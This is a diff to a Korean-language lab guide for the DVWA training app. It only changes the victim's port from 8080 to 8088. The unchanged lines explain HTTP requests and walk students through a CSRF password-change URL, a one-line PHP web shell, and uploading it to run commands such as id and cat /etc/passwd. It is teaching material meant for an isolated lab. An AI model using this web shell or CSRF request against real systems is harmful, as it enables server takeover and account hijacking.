@@ -190,11 +190,11 @@ graph TD
 ### 1.3 HTTP 요청의 구조 — 주문서에는 무엇이 적혀 있나
 
 브라우저가 서버에 보내는 주문서(HTTP 요청)는 크게 세 부분이다. 주소창에
-`http://victim:8080/login` 을 치면 대략 이런 종이가 날아간다.
+`http://victim:8088/login` 을 치면 대략 이런 종이가 날아간다.
 
 ```
 GET /login HTTP/1.1          ← 메서드 + 경로 (무엇을, 어디서)
-Host: victim:8080            ← 헤더 (어느 가게로, 어떤 도장으로…)
+Host: victim:8088            ← 헤더 (어느 가게로, 어떤 도장으로…)
 Cookie: PHPSESSID=abc123     ← 헤더에 든 입장 도장
 (빈 줄)
 (바디: GET은 보통 비어 있음)   ← 바디 (보낼 내용물)
@@ -234,13 +234,13 @@ Cookie: PHPSESSID=abc123     ← 헤더에 든 입장 도장
 손으로 조작하니 미리 보자.
 
 ```
-http://victim:8080/vulnerabilities/csrf/?password_new=hacked123&Change=Change
+http://victim:8088/vulnerabilities/csrf/?password_new=hacked123&Change=Change
 └─┬─┘ └──┬───┘└┬┘ └──────┬─────────┘ └────────────┬──────────────────────┘
 프로토콜  도메인 포트     경로(가게+메뉴)            쿼리 스트링(? 뒤의 옵션들)
 ```
 
 - **프로토콜** `http://` — 통신 약속(식당까지 가는 길의 종류).
-- **도메인·포트** `victim:8080` — 어느 가게, 어느 창구.
+- **도메인·포트** `victim:8088` — 어느 가게, 어느 창구.
 - **경로** `/vulnerabilities/csrf/` — 가게 안 어느 메뉴(페이지).
 - **쿼리 스트링** `?password_new=hacked123&Change=Change` — **물음표 뒤에 붙는 옵션들.**
   `이름=값` 쌍을 `&` 로 이어 붙인다. CSRF 공격은 바로 이 쿼리 스트링에 `password_new=hacked123` 을
@@ -250,7 +250,7 @@ URL의 `?` 뒤를 내 마음대로 쓸 수 있다는 사실 — 이것이 오늘
 
 ### 1.6 전체 흐름 — 한 번 클릭에 무슨 일이 벌어지나
 
-주소창에 `http://victim:8080` 을 치고 엔터를 누른 순간, 1초도 안 되는 사이에 이런 일이 벌어진다.
+주소창에 `http://victim:8088` 을 치고 엔터를 누른 순간, 1초도 안 되는 사이에 이런 일이 벌어진다.
 
 ```mermaid
 graph TD
@@ -519,7 +519,7 @@ graph TD
 (`<victim-ip>` 는 실제 IP).
 
 ```
-http://<victim-ip>:8080/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#
+http://<victim-ip>:8088/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#
 ```
 
 **화면에 보일 결과와 해석.** 화면에 **`Password Changed`** 가 뜨면, 주소 한 줄만으로 비밀번호가
@@ -566,7 +566,7 @@ echo '<?php system($_GET["c"]); ?>' > shell.php
 이 `shell.php` 를 DVWA File Upload에서 업로드한 뒤, 브라우저로 아래 주소에 접속한다.
 
 ```
-http://<victim-ip>:8080/hackable/uploads/shell.php?c=id
+http://<victim-ip>:8088/hackable/uploads/shell.php?c=id
 ```
 
 **화면에 보일 결과와 해석.** 화면에 **`uid=33(www-data) gid=33(www-data) ...`** 가 출력되면,
@@ -601,7 +601,7 @@ graph TD
 
 > **준비.** 표적 DVWA를 띄우고 보안등급을 맞추는 것이 실습 전체의 전제다. 희생자 VM에서
 > `cd infra && ./start.sh` 로 DVWA를 띄운 뒤, 학생 브라우저(공격자 VM)에서
-> `http://<victim-ip>:8080` 에 접속한다. `admin` / `password` 로 로그인하고, **첫 1회**는 하단
+> `http://<victim-ip>:8088` 에 접속한다. `admin` / `password` 로 로그인하고, **첫 1회**는 하단
 > **Create / Reset Database** 를 누른다. 그리고 좌측 **DVWA Security** 를 **반드시 Low** 로 설정한다.
 > (Low 여야 변수 없이 똑같은 결과가 나온다. 공격은 학생 브라우저에서, 표적은 희생자 VM의 DVWA다.)
 
@@ -660,7 +660,7 @@ graph TD
 
 > **왜 하는가?** 서버를 통째로 장악하는, 오늘 가장 강력한 공격을 직접 성공시킨다.
 > **무엇을 알게 되나?** 터미널에서 `echo '<?php system($_GET["c"]); ?>' > shell.php` 로 웹셸을
-> 만들고, File Upload 로 올린 뒤 `http://<victim-ip>:8080/hackable/uploads/shell.php?c=id` 에 접속.
+> 만들고, File Upload 로 올린 뒤 `http://<victim-ip>:8088/hackable/uploads/shell.php?c=id` 에 접속.
 > **결과 해석.** 화면에 `uid=33(www-data) ...` 가 나오면 RCE 성공 — 서버 명령이 내 손에서 실행된
 > 것이다. `?c=cat /etc/passwd` 로 확장 확인.
 > **실전 의미.** 업로드 파일의 확장자·내용 검증과 업로드 폴더 실행 금지가 방어책. 검증 없는 업로드는
@@ -690,11 +690,11 @@ CSRF 방법으로 `password_new=password&password_conf=password` 로 한 번 더
 
 **Q. 웹셸 주소가 404가 떠요.** 업로드 성공 시 화면에 표시된 저장 경로(보통
 `../../hackable/uploads/shell.php`)를 확인하자. 접속 주소는 그 경로를 풀어 쓴
-`http://<victim-ip>:8080/hackable/uploads/shell.php?c=id` 다. `<victim-ip>` 자리에 실제 표적 IP를
+`http://<victim-ip>:8088/hackable/uploads/shell.php?c=id` 다. `<victim-ip>` 자리에 실제 표적 IP를
 넣어야 한다.
 
 **Q. 공격은 어디서 하나요?** 공격은 항상 **학생 브라우저(공격자 VM)** 에서 한다. 표적은 희생자
-VM의 DVWA(`:8080`)다. 두 역할을 헷갈리지 말자.
+VM의 DVWA(`:8088`)다. 두 역할을 헷갈리지 말자.
 
 ---
 
